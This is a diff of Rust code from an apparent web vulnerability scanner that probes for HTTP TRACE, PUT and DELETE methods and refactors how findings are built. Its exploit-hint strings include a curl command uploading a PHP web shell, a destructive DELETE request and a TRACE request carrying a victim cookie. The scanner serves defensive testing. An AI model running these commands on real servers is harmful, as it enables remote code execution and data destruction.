@@ -63,14 +63,13 @@ pub async fn probe(client: &Client, target: &Target) -> anyhow::Result<Vec<Findi
                 .await
             {
                 let status = resp.status().as_u16();
-                let body = resp.text().await.unwrap_or_default();
+                let body = gossan_core::net::bounded_text(resp, 4 * 1024 * 1024).await.unwrap_or_default();
                 // TRACE echoes the request back — look for our marker or TRACE keyword
                 if (200..=299).contains(&status)
                     && (body.contains("X-Gossan-Probe") || body.to_uppercase().contains("TRACE"))
                 {
                     reported_trace = true;
-                    findings.push(
-                        crate::finding_builder(
+                    gossan_core::try_push_finding(crate::misconfig_finding(
                             target,
                             Severity::Low,
                             "HTTP TRACE method enabled — cross-site tracing (XST)",
@@ -84,8 +83,8 @@ pub async fn probe(client: &Client, target: &Target) -> anyhow::Result<Vec<Findi
                         )
                         .evidence(Evidence::HttpResponse {
                             status,
-                            headers: vec![("allow".into(), options_allow.clone())],
-                            body_excerpt: Some(body.chars().take(200).collect()),
+                            headers: vec![("allow".into(), options_allow.clone().into())],
+                            body_excerpt: Some(body.chars().take(200).collect::<String>().into()),
                         })
                         .tag("http-method")
                         .tag("xst")
@@ -93,10 +92,7 @@ pub async fn probe(client: &Client, target: &Target) -> anyhow::Result<Vec<Findi
                         .exploit_hint(format!(
                             "curl -s -X TRACE '{}' -H 'Cookie: session=victim_token'",
                             url
-                        ))
-                        .build()
-                        .expect("finding builder: required fields are set"),
-                    );
+                        )), &mut findings);
                 }
             }
         }
@@ -119,24 +115,21 @@ pub async fn probe(client: &Client, target: &Target) -> anyhow::Result<Vec<Findi
                 let status = resp.status().as_u16();
                 if matches!(status, 200 | 201 | 204) {
                     reported_put = true;
-                    findings.push(
-                        crate::finding_builder(target, Severity::Critical,
+                    gossan_core::try_push_finding(crate::misconfig_finding(target, Severity::Critical,
                             format!("HTTP PUT enabled — arbitrary file write at {}", path),
                             format!("{} accepted an HTTP PUT request (HTTP {}). \
                                      An attacker can upload arbitrary files — including web shells — \
                                      to the server, potentially achieving Remote Code Execution.", put_url, status))
                         .evidence(Evidence::HttpResponse {
                             status,
-                            headers: vec![("allow".into(), options_allow.clone())],
+                            headers: vec![("allow".into(), options_allow.clone().into())],
                             body_excerpt: None,
                         })
                         .tag("http-method").tag("file-upload").tag("rce")
                         .exploit_hint(format!(
                             "# Upload a web shell:\ncurl -s -X PUT '{}webshell.php' \\\n  \
                              -H 'Content-Type: application/x-httpd-php' \\\n  \
-                             -d '<?php system($_GET[\"cmd\"]); ?>'", &put_url.trim_end_matches("gossan-method-probe.txt")))
-                        .build().expect("finding builder: required fields are set")
-                    );
+                             -d '<?php system($_GET[\"cmd\"]); ?>'", &put_url.trim_end_matches("gossan-method-probe.txt"))), &mut findings);
                 }
             }
         }
@@ -154,21 +147,18 @@ pub async fn probe(client: &Client, target: &Target) -> anyhow::Result<Vec<Findi
                 // 405/501 = not really enabled despite OPTIONS claim
                 if matches!(status, 200 | 204 | 404) {
                     reported_delete = true;
-                    findings.push(
-                        crate::finding_builder(target, Severity::High,
+                    gossan_core::try_push_finding(crate::misconfig_finding(target, Severity::High,
                             format!("HTTP DELETE method accepted at {}", path),
                             format!("{} accepted HTTP DELETE (HTTP {}). \
                                      Unauthenticated DELETE on API endpoints allows data destruction — \
                                      bulk record removal, account deletion, or cascading data loss.", del_url, status))
                         .evidence(Evidence::HttpResponse {
                             status,
-                            headers: vec![("allow".into(), options_allow.clone())],
+                            headers: vec![("allow".into(), options_allow.clone().into())],
                             body_excerpt: None,
                         })
                         .tag("http-method").tag("data-destruction").tag("web")
-                        .exploit_hint(format!("curl -s -X DELETE '{}/api/v1/users/1'", base))
-                        .build().expect("finding builder: required fields are set")
-                    );
+                        .exploit_hint(format!("curl -s -X DELETE '{}/api/v1/users/1'", base)), &mut findings);
                 }
             }
         }
